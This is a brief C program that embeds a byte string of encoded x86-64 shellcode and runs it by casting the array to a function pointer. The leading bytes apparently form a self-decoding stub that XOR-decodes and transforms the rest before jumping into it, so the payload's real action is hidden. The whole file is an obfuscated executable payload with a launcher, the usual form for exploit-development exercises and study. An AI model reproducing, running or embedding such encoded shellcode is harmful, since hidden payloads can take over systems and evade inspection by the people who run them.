#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x25\x5e\x56\x48\x89\xf7\x66\x8b\x06\x66\x35\x39\x05\x74\x14\x66\xd1\xe8\x66\x83\xe8\x0d\x88\x07\x48\xff\xc6\x48\xff\xc6\x48\xff\xc7\xeb\xe3\xff\x14\x24\xe8\xd6\xff\xff\xff\x83\x05\x75\x04\x87\x05\xef\x05\x93\x05\xa9\x04\x41\x05\xe7\x05\xd5\x05\xcf\x05\x41\x05\x41\x05\x39\x04\xd3\x05\xf9\x05\xfb\x05\xe1\x05\x43\x04\xa9\x05\x01\x05\x1d\x05\x39\x05";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

